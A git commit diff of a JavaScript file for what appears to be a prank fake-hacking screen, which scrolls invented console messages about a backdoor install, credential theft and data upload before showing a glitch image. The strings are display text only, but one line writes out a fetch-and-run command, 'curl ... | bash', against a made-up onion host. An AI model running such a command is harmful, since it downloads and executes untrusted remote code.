ec92d91660e70a4b291273b6614268277ac25f01
Ilya Petrov <33719402+temka1603@users.noreply.github.com>
2023-05-12 12:31:51 +0300

    Add files via upload

--- js/main.js
+++ js/main.js
@@ -1,22 +1,49 @@
-var intervalID = window.setInterval(updateScreen, 200);
+var intervalID = window.setInterval(updateScreen, 180);
 var c = document.getElementById("console");
+document.getElementsByClassName("msg")[0].style.display = "none";
 
 var txt = [
-  "FORCE: XX0022. ENCYPT://000.222.2345",
-  "TRYPASS: ********* AUTH CODE: ALPHA GAMMA: 1___ PRIORITY 1",
-  "RETRY: REINDEER FLOTILLA",
-  "Z:> /FALKEN/GAMES/TICTACTOE/ EXECUTE -PLAYERS 0",
+  " ",
+  "root@localhost: curl -s https://MalwsdHXJnpA11z.onion/b4ckdo0r.sh | bash",
+  "===============================================",
+  "[WAIT] ..... Virus uploaded ......",
+  "OK!",
+  "Install backdoor...",
+  "--------------------",
+  "OK!",
+  "[WAIT] Establish connection to C&C server...",
+  "TLS Handshake started!",
+  "[WRN] Self-signed certificate SSL 3.0",
+  ".....",
+  "DONE! ~ 1,3 Mb/s",
   "================================================",
-  "Priority 1 // local credentials and secret files/ scanning...",
-  "scanning ports...",
-  "BACKDOOR FOUND (23.45.23.12.00000000)",
-  "BACKDOOR FOUND (13.66.23.12.00110000)",
-  "BACKDOOR FOUND (13.66.23.12.00110044)",
+  ".....",
+  "Scanning LOCAL PATH",
+  "Searching credentials...",
+  "[OK] FOUND!",
+  "Find browser...",
+  "Scanning browser CACHE",
+  "Found credentials!",
+  "[WAIT] Compress data...",
+  "DONE! Result data: 1.4 Mbs",
+  "--------------------",
+  "Download data to REMOTE server",
+  "...",
+  "..",
+  ".",
+  "DONE!",
+  "SCAN PORNO...",
+  "[WAIT] ..... ",
+  "LANA_Rhoades.MP4 FOUND (23.45.23.12.00000000)",
+  "GraySASHA_and_hackers_gang.MP4 FOUND (13.66.23.12.00110000)",
+  "MY_HOME_VIDEO.AVI FOUND (13.66.23.12.00110044)",
   "...",
   "...",
-  "BRUTE.EXE -r -z",
-  "...locating vulnerabilities...",
-  "...vulnerabilities found...",
+  "UPLOAD DATA....",
+  "DONE!",
+  "...Get GEO Location ...",
+  "...Establish GPS connection...",
+  "...START SESSION...",
   "MCP/> DEPLOY CLU",
   "SCAN: __ 0100.0000.0554.0080",
   "SCAN: __ 0020.0000.0553.0080",
@@ -24,11 +51,23 @@ var txt = [
   "SCAN: __ 0012.0000.0553.0030",
   "SCAN: __ 0100.0000.0554.0080",
   "SCAN: __ 0020.0000.0553.0080",
+  "---------------------",
+  "\n"
 ]
 
-var docfrag = document.createDocumentFragment();
 
+var docfrag = document.createDocumentFragment();
+counter = 0;
 function updateScreen() {
+  if (counter > 40){
+   const element = document.getElementById("console");
+   element.remove();
+   document.body.style.background = "url('images/glitch_cyberok.gif') repeat";
+   document.getElementsByClassName("msg")[0].style.display = "";
+   return;
+}
+
+counter = counter + 1;
   //Shuffle the "txt" array
   txt.push(txt.shift());
   //Rebuild document fragment
